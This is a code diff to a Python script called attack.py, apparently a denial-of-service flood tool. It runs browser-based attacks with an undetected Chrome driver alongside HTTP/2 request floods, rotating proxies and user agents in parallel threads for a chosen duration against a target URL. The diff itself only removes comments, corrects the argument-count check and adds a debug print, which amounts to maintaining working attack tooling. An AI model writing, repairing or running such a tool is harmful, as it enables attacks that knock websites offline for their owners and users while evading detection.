@@ -10,7 +10,7 @@ import undetected_chromedriver as uc
 from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.service import Service
 from datetime import datetime
-import httpx  # For HTTP/2 requests
+import httpx
 import pytesseract
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
@@ -155,7 +155,6 @@ def browser_attack(proxy, user_agent, target_url):
         format_output(proxy, user_agent, "", "", False)
         print(f"Error during browser attack: {e}")
 
-# HTTP/2 Attack Method
 def http2_attack(target_url, proxy, user_agent):
     headers = {
         'User-Agent': user_agent,
@@ -177,7 +176,6 @@ def http2_attack(target_url, proxy, user_agent):
     except Exception as e:
         print(f"[HTTP/2] Error during HTTP/2 attack: {e}")
 
-# Function to run both attacks (browser & http2) in parallel
 def combined_attack(proxy, user_agent, target_url):
     browser_thread = Thread(target=browser_attack, args=(proxy, user_agent, target_url))
     http2_thread = Thread(target=http2_attack, args=(target_url, proxy, user_agent))
@@ -195,7 +193,8 @@ def start_attack(proxy_list, user_agent_list, target_url, duration):
         user_agent = random.choice(user_agent_list)
         combined_attack(proxy, user_agent, target_url)
 
-if len(sys.argv) != 5:
+# Check command-line arguments
+if len(sys.argv) != 6:
     print("Usage: python attack.py [targetURL] [duration] [threads] [proxyFile] [userAgentFile]")
     sys.exit(1)
 
@@ -204,6 +203,9 @@ duration = int(sys.argv[2])
 threads = int(sys.argv[3])
 proxy_file = sys.argv[4]
 user_agent_file = sys.argv[5]
+
+# Print arguments for debugging
+print(f"Arguments passed: target_url={target_url}, duration={duration}, threads={threads}, proxy_file={proxy_file}, user_agent_file={user_agent_file}")
 
 # Load proxies and user-agents
 proxy_list = load_proxies(proxy_file)
